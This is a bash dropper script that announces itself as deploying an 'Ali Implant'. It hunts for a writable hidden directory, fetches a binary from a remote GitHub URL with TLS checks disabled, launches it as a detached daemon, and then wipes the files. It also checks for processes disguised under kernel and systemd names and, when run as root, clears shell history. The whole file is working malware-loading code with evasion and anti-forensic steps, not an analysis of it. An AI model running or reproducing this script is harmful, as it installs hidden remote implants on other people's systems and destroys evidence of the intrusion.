#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/Ali"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

IS_ROOT=0
[ "$(id -u)" = "0" ] && IS_ROOT=1

find_work_dir() {
    local candidates=(
        "/dev/shm"
        "/run/user/$(id -u)"
        "/tmp"
        "/var/tmp"
        "/usr/tmp"
        "$HOME"
        "$HOME/.cache"
        "$HOME/.local/share"
        "/var/www/html"
        "/var/www"
        "/srv"
        "/mnt"
        "/opt"
        "/var/log"
    )
    candidates+=("$(pwd)")

    # FIX: Thêm timeout 2s cho findmnt/mount để tránh treo nếu có ổ mạng bị đơ
    if command -v findmnt >/dev/null 2>&1; then
        while IFS= read -r mnt; do
            [ -n "$mnt" ] && candidates+=("$mnt")
        done < <(timeout 2 findmnt -n -o TARGET 2>/dev/null | grep -v -E '^/(proc|sys|dev/pts)')
    else
        while IFS= read -r mnt; do
            [ -n "$mnt" ] && candidates+=("$mnt")
        done < <(timeout 2 mount 2>/dev/null | awk '{for(i=3;i<=NF;i++) printf "%s%s", $i, (i==NF?ORS:OFS)}' | grep -v -E '^/(proc|sys|dev/pts)')
    fi

    for base in "${candidates[@]}"; do
        [ -z "$base" ] && continue
        [ -d "$base" ] || continue
        [ -w "$base" ] || continue
        
        # FIX: Thêm timeout 1s cho df, tránh treo khi quét NFS/SMB
        local avail=$(timeout 1 df -Pk "$base" 2>/dev/null | awk 'NR==2 {print $4}')
        [ "${avail:-0}" -lt 10240 ] && continue

        local tdir="$base/.sys"
        if mkdir -p "$tdir" 2>/dev/null && [ -w "$tdir" ]; then
            local tbin="$tdir/.wtest"
            echo '#!/bin/sh' > "$tbin" 2>/dev/null
            echo 'exit 0' >> "$tbin" 2>/dev/null
            chmod +x "$tbin" 2>/dev/null
            
            # Bọc timeout 1s cho cả lúc test file thực thi
            if timeout 1 "$tbin" >/dev/null 2>&1; then
                rm -f "$tbin"
                echo "$tdir"
                return 0
            fi
            rm -f "$tbin"
        fi
    done
    return 1
}

echo "[*] Deploying Ali Implant (Root: $IS_ROOT)..."
echo "[*] Auto-detecting writable & executable directory..."

# FIX: Bọc timeout 10s cho toàn bộ hàm tìm thư mục, nếu quá 10s sẽ hủy và báo lỗi
DIR=$(timeout 10 bash -c "$(declare -f find_work_dir); find_work_dir")

if [ -z "$DIR" ]; then
    echo "[-] CRITICAL: No writable and executable directory found (or timed out)."
    exit 1
fi

echo "[+] Selected directory: $DIR"
BIN="$DIR/Ali"

dl() {
    local url="$1"
    local out="$2"
    rm -f "$out"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 10 --doh-url "https://cloudflare-dns.com/dns-query" -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && return 0
        curl -fsSLk --connect-timeout 10 --doh-url "https://cloudflare-dns.com/dns-query" -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        wget -qT 10 -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && return 0
        wget -qT 10 --no-check-certificate -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import sys, urllib.request, ssl
req = urllib.request.Request(sys.argv[2], headers={'User-Agent': sys.argv[3]})
ctx = ssl._create_unverified_context()
with urllib.request.urlopen(req, context=ctx, timeout=10) as r, open(sys.argv[1], 'wb') as f:
    f.write(r.read())
" "$out" "$url" "$UA" 2>/dev/null && [ -s "$out" ] && return 0
    fi
    return 1
}

echo "[*] Downloading Ali payload..."
for i in 1 2 3; do
    dl "$URL" "$BIN" && break
    [ "$i" -lt 3 ] && sleep 2
done

if [ ! -s "$BIN" ]; then
    echo "[-] Download failed."
    exit 1
fi

chmod +x "$BIN"

rm -f /tmp/.sys-lock-v2 /tmp/.sys-lock /tmp/.client.lock 2>/dev/null

echo "[*] Executing Ali (Daemon Mode)..."
nohup setsid "$BIN" -d < /dev/null > /dev/null 2>&1 &
PID=$!
disown

sleep 3

rm -f "$BIN" 2>/dev/null
rm -rf "$DIR" 2>/dev/null

if kill -0 "$PID" 2>/dev/null; then
    echo "[*] Done. Ali is running in background. Files wiped."
else
    if pgrep -f "kworker/0:1H-kblockd" >/dev/null 2>&1 || pgrep -f "systemd-networkd-helper" >/dev/null 2>&1 || pgrep -f "systemd-journald-helper" >/dev/null 2>&1; then
        echo "[*] Done. Ali is running (hidden process detected). Files wiped."
    else
        echo "[-] WARNING: Process not found. Debugging output:"
        dl "$URL" "$BIN" >/dev/null 2>&1
        chmod +x "$BIN"
        echo "---------------------------------------------------"
        "$BIN"
        echo "---------------------------------------------------"
        rm -f "$BIN"
    fi
fi

if [ "$IS_ROOT" -eq 1 ]; then
    history -c 2>/dev/null || true
    unset HISTFILE
    [ -f "$HOME/.bash_history" ] && cat /dev/null > "$HOME/.bash_history" 2>/dev/null || true
fi

exit 0
